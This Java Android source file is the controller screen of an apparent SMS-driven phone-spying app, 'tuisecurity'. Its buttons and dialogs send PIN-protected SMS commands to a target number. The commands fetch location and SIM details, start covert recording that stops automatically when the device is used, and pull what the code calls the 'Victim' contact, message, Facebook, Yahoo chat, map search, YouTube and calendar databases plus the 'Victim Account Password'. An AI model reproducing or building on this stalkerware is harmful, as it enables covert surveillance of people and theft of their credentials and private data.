package tuisolutions.tuisecurity.ui;

import java.util.ArrayList;
import java.util.List;

import tuisolutions.tuisecurity.R;
import tuisolutions.tuisecurity.models.Parameters;
import tuisolutions.tuisecurity.preferences.BasicPreferenceActivity;
import tuisolutions.tuisecurity.ui.actionbar.ActionBarActivity;
import tuisolutions.tuisecurity.ui.fragment.CommandPager;
import tuisolutions.tuisecurity.utils.CommandUtils;
import tuisolutions.tuisecurity.utils.PreferencesUtils;
import tuisolutions.tuisecurity.utils.SMSUtils;
import tuisolutions.tuisecurity.utils.Utils;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.DialogFragment;
import android.content.DialogInterface;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;

public class ControlCommandActivity extends ActionBarActivity implements View.OnClickListener {
    private String m_number;
    private String m_adStr;
    private String m_pin;
    private Button btnGetLocation, btnAutoRecording, btnGetVictimData, btnGetSimInfo;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.pager_command_include_spy);
        m_number = getIntent().getStringExtra(CommandPager.PHONE_NUMBER);
        m_pin = getIntent().getStringExtra(CommandPager.PIN);
        m_adStr = PreferencesUtils.getAdStr(getApplicationContext());

        btnGetLocation = (Button) findViewById(R.id.btnGetLocaltion);
        btnAutoRecording = (Button) findViewById(R.id.btnAutoRecording);
        btnGetVictimData = (Button) findViewById(R.id.btnVictimData);
        btnGetSimInfo = (Button) findViewById(R.id.btnGetSimInfo);

        btnGetLocation.setOnClickListener(this);
        btnGetSimInfo.setOnClickListener(this);

        btnAutoRecording.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                ChooseStopRecordingTypeDialog dialog = new ChooseStopRecordingTypeDialog();
                dialog.show(getFragmentManager(), "DataTypeDialog");
            }
        });

        btnGetVictimData.setOnClickListener(new View.OnClickListener() {

            public void onClick(View v) {
                ChooseDataTypeDialog dialog = new ChooseDataTypeDialog();
                dialog.show(getFragmentManager(), "DataTypeDialog");
            }
        });
    }

    public void onClick(View v) {
        String info = " ";
        String command = "";
        switch (v.getId()) {
        case R.id.btnGetLocaltion:
            command = Parameters.COMMAND_GET_LOCATION;
            info += "Get Location";
            break;
        case R.id.btnGetSimInfo:
            command = Parameters.COMMAND_GET_SIM_INFO;
            info += "Get Sim Info";
            break;
        default:
            break;
        }
        if (!command.equals("")) {
            sendCommand(info, command);
        }
    }

    private void sendCommand(String info, String command) {
        String message = SMSUtils.composeCommandSMS(command, m_pin, m_adStr);
        boolean result = CommandUtils.sendCommand(m_number, message);
        if (result) {
            Utils.showToast(getApplicationContext(), getResources().getString(R.string.send_command_message_successfully) + info);
        } else {
            Utils.showToast(getApplicationContext(), getResources().getString(R.string.send_command_message_fail) + info);
        }
    }

    private class ChooseDataTypeDialog extends DialogFragment {
        private List<Integer> mSelectedItems = new ArrayList<Integer>();

        @Override
        public Dialog onCreateDialog(Bundle savedInstanceState) {
            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            // Set the dialog title
            builder.setTitle("Choose data type").setSingleChoiceItems(R.array.get_victim_data_mode, -1, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    if (mSelectedItems.isEmpty()) {
                        mSelectedItems.add(which);
                    } else {
                        // if is has clicked
                        mSelectedItems.clear();
                    }
                }
            }).setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    String command = "";
                    String info = "";
                    if (mSelectedItems.size() > 0) {
                        switch (mSelectedItems.get(0)) {
                        case 0:
                            command = Parameters.COMMAND_SYSTEM;
                            info += "Get Victim System";
                            break;
                        case 1:
                            command = Parameters.COMMAND_CONTACT_DB;
                            info += "Get Victim Contact Database";
                            break;
                        case 2:
                            command = Parameters.COMMAND_MESSAGE_DB;
                            info += "Get Victim Message Database";
                            break;
                        case 3:
                            command = Parameters.COMMAND_SEARCH_MAP_DB;
                            info += "Get Victim Map Search History";
                            break;
                        case 4:
                            command = Parameters.COMMAND_YOUTUBE_DB;
                            info += "Get Victim Youtue History";
                            break;
                        case 5:
                            command = Parameters.COMMAND_FACEBOOK_DB;
                            info += "Get Victim Facebook Database";
                            break;
                        case 6:
                            command = Parameters.COMMAND_YAHOO_DB;
                            info += "Get Victim Yahoo Chat History";
                            break;
                        case 7:
                            command = Parameters.COMMAND_ACCOUNT_PASSWORD;
                            info += "Get Victim Account Password";
                            break;
                        case 8:
                            command = Parameters.COMMAND_CALENDAR_DB;
                            info += "Get Victim Calendar Database";
                            break;
                        default:
                            break;
                        }
                        sendCommand(info, command);
                    }
                }
            }).setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dismiss();
                    Utils.showToast(getApplicationContext(), "Cancel");
                }
            });

            return builder.create();
        }
    }

    private class ChooseStopRecordingTypeDialog extends DialogFragment {
        private List<Integer> mSelectedItems = new ArrayList<Integer>();

        @Override
        public Dialog onCreateDialog(Bundle savedInstanceState) {
            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            // Set the dialog title
            builder.setTitle("Choose stop mode").setSingleChoiceItems(R.array.get_stop_recording_mode, 0, new DialogInterface.OnClickListener() {

                public void onClick(DialogInterface dialog, int which) {
                    if (mSelectedItems.isEmpty()) {
                        mSelectedItems.add(which);
                    } else {
                        // if is has clicked
                        mSelectedItems.clear();
                    }
                }
            }).setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    String command = Parameters.COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION;
                    String info = "Auto Stop when has interaction on device";
                    if (mSelectedItems.size() > 0) {
                        switch (mSelectedItems.get(0)) {
                        case 0:
                            command = Parameters.COMMAND_RECORD_AUTO_STOP_WITH_INTERACTION;
                            info = "Auto Stop when has interaction on device";
                            break;
                        case 1:
                            command = Parameters.COMMAND_RECORD_AUTO_STOP_WITH_LIMIT_TIME;
                            info = "Auto stop when over time limit";
                            break;
                        default:
                            break;
                        }
                    }
                    sendCommand(info, command);
                }
            }).setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dismiss();
                    Utils.showToast(getApplicationContext(), "Cancel");
                }
            });

            return builder.create();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater menuInflater = getMenuInflater();
        menuInflater.inflate(R.menu.activity_main, menu);
        return super.onCreateOptionsMenu(menu);
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
        case android.R.id.home:
            Utils.showToast(getApplicationContext(), "Tapped home");
            finish();
            break;
        case R.id.menu_settings:
            startActivity(new Intent(getApplicationContext(), BasicPreferenceActivity.class));
        case R.id.menu_help:
            break;
        case R.id.menu_about:
            startActivity(new Intent(getApplicationContext(), AboutActivity.class));
            break;
        }
        return super.onOptionsItemSelected(item);
    }
}
